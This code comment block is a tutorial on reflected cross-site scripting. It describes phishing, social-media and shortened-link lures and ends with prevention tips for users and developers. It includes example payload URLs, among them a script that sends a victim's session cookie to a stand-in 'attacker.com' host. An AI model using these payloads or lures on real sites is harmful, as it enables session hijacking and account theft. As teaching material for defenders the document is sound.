/*
    Reflected XSS Attack - How a User Receives and Clicks a Malicious Link

    1. Attacker Finds a Vulnerability
       - The attacker finds a website that doesn’t properly sanitize user inputs.
       - They create a malicious URL that injects a script into the website.

       Example of a malicious URL:
       https://example.com/search?query=<script>alert('XSS')</script>

    2. How the Victim Receives the Malicious Link
       - The attacker tricks the victim into clicking the link using various methods:

       a) Phishing Emails
          - The attacker sends an email that looks like it's from a trusted source.
          - The email might say: "Check your account here!" with a link like:
            https://example.com/search?query=<script>stealData()</script>
          - The victim clicks the link without realizing it's malicious.

       b) Social Media Posts or Messages
          - The attacker posts on social media or sends a message: "Get a great discount!"
          - The link looks like:
            https://example.com/offers?discount=<script>stealCookie()</script>
          - The victim clicks, thinking it's a safe offer.

       c) URL Shorteners
          - The attacker uses a URL shortener to hide the malicious script.
          - The shortened link looks like:
            https://bit.ly/2Hk2VY5
          - The victim clicks on it without suspecting anything.

    3. What Happens After Clicking the Link
       - Once the victim clicks the malicious URL, the website reflects the script back into the webpage.
       - Since the victim is already logged in, the malicious script can steal sensitive data.

       Example of a malicious script:
       https://example.com/search?query=<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>
       - This script retrieves the victim's session cookie (document.cookie) and sends it to the attacker’s server.

    4. Result - Session Hijacking
       - The attacker now has the victim's session cookie.
       - They can use it to log in as the victim and perform actions like changing passwords or stealing personal data.

    Summary:
    - The attacker creates a malicious URL with an embedded script.
    - They trick the user into clicking the link using emails, social media, or short URLs.
    - The website reflects the script, which runs in the user’s browser and steals data.
    - The attacker now has access to the victim’s account.

    Prevention Tips for Users:
    - Avoid clicking on suspicious links in emails or messages.
    - Double-check URLs before clicking them.
    - Don’t click on shortened links from unknown sources.
    - Use browser extensions that block malicious scripts.

    ---------------------------------------------------

    Preventive Measures for Developers:

    1. Sanitize all input:
       - Ensure that user inputs, especially those reflected in the response, are properly sanitized to escape special characters like <, >, and &.

    2. Use HTTPOnly Cookies:
       - Mark session cookies with the HttpOnly flag, preventing JavaScript from accessing the cookies.

    3. Content Security Policy (CSP):
       - Implement a strict CSP that limits where scripts can be loaded from and executed, reducing the chances of executing malicious scripts.

    4. Input Validation:
       - Validate and sanitize user inputs both on the client and server sides to ensure they follow expected formats and constraints.

    5. SameSite Cookies:
       - Use the SameSite attribute for cookies, which can prevent cookies from being sent in cross-site requests, reducing the risk of XSS attacks.
*/
